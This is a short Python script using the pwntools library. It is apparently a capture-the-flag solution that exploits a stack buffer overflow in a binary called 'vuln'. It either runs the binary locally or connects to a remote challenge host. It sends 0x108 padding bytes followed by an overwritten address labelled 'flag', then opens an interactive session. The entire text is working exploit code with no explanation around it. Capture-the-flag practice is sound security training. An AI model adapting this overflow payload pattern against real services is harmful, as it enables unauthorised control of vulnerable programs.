from pwn import *
import sys

if len(sys.argv) == 1 :
	p = process('./vuln')
else :
	p = connect('icewall-ctf.kr', 10206)

# Addr
flag = 0x601060

payload = 'A'*0x108
payload += p64(flag)

p.sendlineafter('?\n', payload)
print p.recvline()

p.interactive()
